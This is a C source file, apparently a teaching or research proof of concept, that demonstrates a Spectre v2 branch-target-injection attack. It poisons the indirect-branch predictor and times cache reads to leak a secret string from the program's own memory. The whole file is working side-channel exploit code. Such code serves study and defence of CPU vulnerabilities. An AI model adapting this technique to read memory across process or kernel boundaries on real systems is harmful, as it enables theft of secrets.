/*
 *  Program uses spectre v2 to read its own memory.
 */

#pragma clang optimize off

#include <stdio.h>
#include <cstring>
#include <stdlib.h>
#include "sysstubs.h"



#define CACHE_HIT_THRESHOLD 80
#define GAP 1024

static inline void clflush(volatile void *p)
{
  __asm volatile("clflush (%0)" :: "r" (p));
}

static inline void mfence()
{
  __asm volatile("mfence");
}

static inline uint64_t
rdtsc(void)
{
  uint32_t hi, lo;
  __asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
  return ((uint64_t)lo)|(((uint64_t)hi)<<32);
}

u8 *channel; // side channel to extract secret phrase
u64 *target; // pointer to indirect call target
char *secretPhrase = "The Magic Words are Please and Thank You.\0\0\0";
const int secretPhraseLen = 42;

// mistrained target of indirect call
__attribute__((noinline))
int
user_gadget(char *addr)
{
  return channel[*addr * GAP]; // loads seem to fetch cache line more consistently than stores
}

// actual target of indirect call
__attribute__((noinline))
int
user_safe()
{
  return 4;
}

// function that makes indirect call
__attribute__((noinline))
int
user_victim(volatile char *addr, volatile int input) // addr will be passed to user_gadget via %rdi
{
  int result;
  __asm volatile("dummy_victim_start:\n"
                 "   mov $0, %%rdx\n"
                 "1: cmp $0x64, %%rdx\n"
                 "   jle 2f\n"
                 "   jmp 4f\n"
                 "2: jmp 3f\n"
                 "3: add $0x1, %%rdx\n"
                 "4: call *%1\n"
                 "   movl %%eax, %0\n"
                 : "=r" (result) : "r" (*target): "rdx");
  return result;
}

// see appendix C of https://spectreattack.com/spectre.pdf
int
readByte(volatile char *addrToRead, char result[2])
{
  int hits[256]; // record cache hits
  int tries, i, j, k, mix_i, junk = 0;
  u64 start, elapsed;
  volatile u8 *addr;
  char dummyChar = '$';
  volatile char *dummyCharAddr = &dummyChar;

  for (i = 0; i < 256; i++) {
    hits[i] = 0;
    channel[i * GAP] = 1;
  }

  for (tries = 999; tries > 0; tries--) {
    // poison branch target predictor
    *target = (u64)&user_gadget;
    mfence();
    for (j = 50; j > 0; j--) {
      junk ^= user_victim(dummyCharAddr, 0);
    }
    mfence();

    // flush side channel
    for (i = 0; i < 256; i++)
      clflush(&channel[i * GAP]);
    mfence();

    // change to safe target
    *target = (u64)&user_safe;
    mfence();

    // flush target to prolong misprediction interval
    clflush((void*) target);
    mfence();

    // call victim
    junk ^= user_victim(addrToRead, 0);
    mfence();

    // time reads, mix up order to prevent stride prediction
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &channel[mix_i * GAP];
      start = rdtsc();
      junk ^= *addr;
      mfence(); // make sure read completes before we check the timer
      elapsed = rdtsc() - start;
      if (elapsed <= CACHE_HIT_THRESHOLD)
        hits[mix_i]++;
    }
  }

  // locate top two results
  j = k = -1;
  for (i = 0; i < 256; i++) {
    if (j < 0 || hits[i] >= hits[j]) {
      k = j;
      j = i;
    } else if (k < 0 || hits[i] >= hits[k]) {
      k = i;
    }
  }

  if ((hits[j] >= 2 * hits[k] + 2) ||
      (hits[j] == 2 && hits[k] == 0)) {
    result[0] = (char) j;
    result[1] = 1;
  } else {
    result[0] = 0;
    result[1] = 0;
  }

  return junk; // prevent junk from being optimized out
}

int
main(int argc, char *argv[])
{
  target = (u64*)malloc(sizeof(u64));
  channel = (u8*)malloc(256 * GAP * sizeof(u8));

  int junk = 0;
  char result[2]; // result[0] is the char, result[1] == 1 if char is valid
  int index = 0;

  printf("Reading secret phrase: ");
  while (index < secretPhraseLen) {
    junk += readByte(secretPhrase + index, result);
    if (result[1] == 1) {
      if (result[0] == 0)
        break;
      printf("%c", result[0]);
    } else {
      printf("?");
    }
    fflush(stdout);
    index++;
  }

  printf("\n");
  fprintf(fopen("/dev/null", "w"), "%d", junk); // prevent junk from being optimized out
  return 0;
}
